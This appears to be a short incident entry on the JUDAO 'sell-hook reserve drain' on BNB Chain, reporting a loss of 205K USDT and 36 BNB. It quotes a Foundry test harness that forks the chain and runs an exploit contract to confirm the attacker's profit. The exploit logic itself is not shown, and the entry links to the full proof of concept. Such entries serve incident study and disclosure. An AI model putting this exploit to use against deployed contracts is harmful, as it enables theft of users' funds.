# [?] JUDAO - JUDAO sell-hook reserve drain

## Summary
Severity: Unknown
Chain: BNB Chain
Component: JUDAO
Published: 2026-04-28
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/JUDAO_exp.sol
Type: defi-exploit-poc

## Details
Lost: 205K USDT + 36 BNB

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 95_070_973;
        vm.createSelectFork("bsc", forkBlock);
        fundingToken = USDT_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(JUDAO, "JUDAO");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(JUDAO_USDT_PAIR, "JUDAO/USDT Pancake pair");
        vm.label(MOOLAH, "Moolah flash loan proxy");
        vm.label(PANCAKE_ROUTER, "Pancake router");
    }

    function testExploit() public balanceLog {
        vm.deal(ATTACKER, 0);
        uint256 usdtBefore = IERC20(USDT_TOKEN).balanceOf(ATTACKER);
        uint256 bnbBefore = ATTACKER.balance;

        JUDAOExploit exploit = new JUDAOExploit(ATTACKER);

        vm.prank(ATTACKER);
        exploit.attack();

        uint256 usdtProfit = IERC20(USDT_TOKEN).balanceOf(ATTACKER) - usdtBefore;
        uint256 bnbProfit = ATTACKER.balance - bnbBefore;

        logTokenBalance(USDT_TOKEN, ATTACKER, "Attacker Final");
        emit log_named_decimal_uint("Attacker Final BNB Balance", ATTACKER.balance, 18);
        assertGt(usdtProfit, 200_000 ether, "USDT profit");
        assertEq(bnbProfit, 36 ether, "BNB profit");
    }
}
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/JUDAO_exp.sol_
